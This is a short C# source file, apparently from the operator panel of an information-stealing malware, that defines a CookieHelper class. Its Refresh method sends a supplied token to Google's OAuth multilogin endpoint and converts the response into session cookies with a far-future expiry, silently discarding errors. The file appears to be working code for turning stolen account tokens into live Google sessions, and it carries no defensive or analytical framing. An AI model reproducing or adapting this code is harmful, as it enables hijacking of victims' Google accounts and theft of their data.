using Meta.SharedModels;
using RestSharp;
using System;
using System.Collections.Generic;

namespace Meta.MainPanel.Data.Helpers;

public static class CookieHelper
{
    public static List<Cookie> Refresh(string token)
    {
        List<Cookie> list = new List<Cookie>();
        try
        {
            RestClient client = new RestClient("https://accounts.google.com/oauth/multilogin");
            RestRequest restRequest = new RestRequest(Method.POST);
            restRequest.AddHeader("Accept", "*/*");
            restRequest.AddHeader("Authorization", "MultiBearer " + token);
            restRequest.AddHeader("Accept-Language", "en-US,en;q=0.9");
            restRequest.AddHeader("Content-Type", "application/x-www-form-urlencoded");
            restRequest.AddQueryParameter("source", "com.google.Drive");
            dynamic val = client.Post(restRequest).Content.Replace(")]}'", string.Empty).FromJSON<object>();
            foreach (dynamic item in val["cookies"])
            {
                string text = null;
                try
                {
                    if (item["domain"] != null)
                    {
                        text = item["domain"].ToString();
                    }
                }
                catch (Exception)
                {
                }
                if (string.IsNullOrWhiteSpace(text))
                {
                    try
                    {
                        text = item["host"].ToString();
                    }
                    catch (Exception)
                    {
                    }
                }
                if (!string.IsNullOrWhiteSpace(text))
                {
                    list.Add(new Cookie
                    {
                        Expires = 1800000000L,
                        Host = text,
                        Http = true,
                        Path = item["path"].ToString(),
                        Secure = false,
                        Name = item["name"].ToString(),
                        Value = item["value"].ToString()
                    });
                }
            }
        }
        catch (Exception)
        {
        }
        return list;
    }
}
